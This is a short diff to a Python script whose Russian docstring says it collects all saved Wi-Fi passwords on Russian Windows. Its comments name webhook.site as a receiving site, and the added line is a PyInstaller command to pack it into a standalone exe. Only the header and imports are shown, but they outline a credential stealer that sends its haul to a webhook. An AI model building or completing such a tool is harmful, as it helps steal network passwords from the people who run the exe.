@@ -1,5 +1,6 @@
 """Загрузка всех паролей от wi_fi на русской Windows"""
 # для формирования exe используй pyinstaller. Свободный сайт https://webhook.site/
+# команда для запуска python -m PyInstaller --onefile .\app.py
 
 import subprocess
 import re
